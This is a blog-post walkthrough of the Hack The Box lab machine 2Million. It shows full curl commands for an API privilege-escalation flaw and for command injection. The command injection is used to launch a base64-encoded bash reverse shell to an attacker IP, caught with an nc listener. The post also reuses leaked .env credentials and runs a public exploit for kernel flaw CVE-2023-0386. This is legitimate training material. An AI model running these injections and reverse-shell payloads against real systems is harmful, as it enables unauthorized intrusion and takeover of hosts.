---
layout: post
title: "Hack The Box: 2Million - A Narrative Walkthrough"
date: 2025-07-03
tags: [htb, ctf, walkthrough, cybersecurity]
---

# Hack The Box: 2Million - A Narrative Walkthrough

Welcome to my walkthrough of the Hack The Box (HTB) machine: **2Million**. What began as a series of recon notes evolved into a story of curiosity, API exploration, privilege escalation, and ultimately, root access. Let's dive in.

---

## Reconnaissance & First Impressions

I began my journey with an Nmap scan:

```bash
nmap -A 10.10.11.221 -oN scan.initial
```

The scan revealed two open ports:

- **22/tcp**: OpenSSH 8.9p1
    
- **80/tcp**: HTTP (nginx)
    

Navigating to the IP in a browser resulted in a redirect to `http://2million.htb/`, which didn't resolve—until I added the following line to my `/etc/hosts` file:

```bash
10.10.11.221 2million.htb
```

Once added, the page loaded immediately. It looked like a promotional site for HTB. Scrolling down, I saw a call to action inviting me to join. I clicked.

![[Pasted image 20250701185331.png]]
![[Pasted image 20250701185430.png]]



I poked around and soon discovered some JavaScript references in the source:

```javascript
eval(function(p,a,c,k,e,d)...)
```

Yep: classic obfuscated JavaScript. I pasted the blob into [this online JS unpacker](https://matthewfl.com/unPacker.html) and got a cleaner view of the logic. Two functions stood out:

- `verifyInviteCode(code)`
- `makeInviteCode()`

We're here to generate, not verify—so I hit the relevant endpoint:

```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate
```

Response:

```json
{"data":"Va beqre gb trarengr...","enctype":"ROT13"}
```

ROT13! A quick run through CyberChef decoded it to:

```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

So I did.

### Getting the Invite Code

```bash
curl -X POST http://2million.htb/api/v1/invite/generate
```

Output:

```json
{"code":"MTc5RVotQzA0UkctOTI5V0YtOUhPNzA="}
```

That smelled like Base64, and decoding it gave me:

```
179EZ-C04RG-929WF-9HO70
```

Bingo—valid invite code.

## Exploring the API

After signing up with the invite code, I started poking the API using Burp Suite and curl. I noticed that while most routes redirected or denied access, `/api` and `/api/v1` returned `401 Unauthorized`.

So I grabbed my `PHPSESSID` from the browser session and tried again:

```bash
curl -i http://2million.htb/api \
  -H "Cookie: PHPSESSID=<session>"
```

Success! I was in.

Pretty soon I had a full list of exposed endpoints. Some were for regular users, but a few were under `/admin/`, including:

- `/api/v1/admin/auth`
- `/api/v1/admin/settings/update`
- `/api/v1/admin/vpn/generate`

Checking my privileges:

```bash
curl http://2million.htb/api/v1/user/auth -H "Cookie: PHPSESSID=<session>"
# {"loggedin":true, "username":"USER", "is_admin":0}
```

Not admin. Yet.

## Upgrading to Admin

I began experimenting with `PUT` requests to `/admin/settings/update`. After a few failed attempts, I hit gold:

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Cookie: PHPSESSID=<session>" \
  -H "Content-Type: application/json" \
  -d '{"is_admin":1, "email":"REDACTED"}'
```

Now I was admin. Confirmed via:

```bash
curl http://2million.htb/api/v1/admin/auth -H "Cookie: PHPSESSID=<session>"
# {"message":true}
```

## Remote Code Execution (RCE)

With admin status, I went after the `/admin/vpn/generate` endpoint, trying to inject commands. After some trial and error, this payload executed:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=<session>" \
  -H "Content-Type: application/json" \
  -d '{"username":"USER; whoami;"}'
```

Response:

```
www-data
```

RCE achieved.

I wanted a full reverse shell. To avoid shell parsing issues, I base64-encoded the payload:

```bash
echo 'bash -i >& /dev/tcp/10.10.14.223/1234 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjMvMTIzNCAwPiYxCg==
```

Then sent it:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=<session>" \
  -H "Content-Type: application/json" \
  -d '{"username":"USER; echo <base64> | base64 -d | bash;"}'
```

Meanwhile, my listener was waiting:

```bash
nc -lvp 1234
```

Shell obtained.

## User Flag

With access as `www-data`, I dug through the site files and found the `.env` file, which contained database credentials:

```
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

I noticed a local user `admin`, and tried the creds over SSH:

```bash
ssh admin@2million.htb
```

They worked!

```bash
cat user.txt
# deee6b52e5cefa369cd0f82238228e5b
```

## Privilege Escalation

Reading `/var/mail/admin`, I saw this note:

```
... upgrade the OS ... OverlayFS / FUSE looks nasty ...
```

Aha—CVE-2023-0386.

### Checking for Vulnerability

```bash
uname -r
# 5.15.70
lsmod | grep overlay
# overlay 151552  0
grep CONFIG_USER_NS /boot/config-$(uname -r)
# CONFIG_USER_NS=y
```

Vulnerable.

### Exploiting CVE-2023-0386

I grabbed the [exploit from GitHub](https://github.com/xkaneiki/CVE-2023-0386), zipped it, and transferred it via SCP:

```bash
zip -r cve.zip CVE-2023-0386
scp cve.zip admin@2million.htb:/tmp/t2
```

### Exploit Instructions

```bash
make all
./fuse ./ovlcap/lower ./gc
./exp
```

![[Pasted image 20250702183058.png]]
Root shell popped.

## Final Thoughts

This box was a great mix of web, API, and kernel exploitation. I appreciated how the narrative clues guided the flow from recon to root, while still requiring trial-and-error and careful reading. Always satisfying when both the logic _and_ the exploit align cleanly.

Thanks for reading!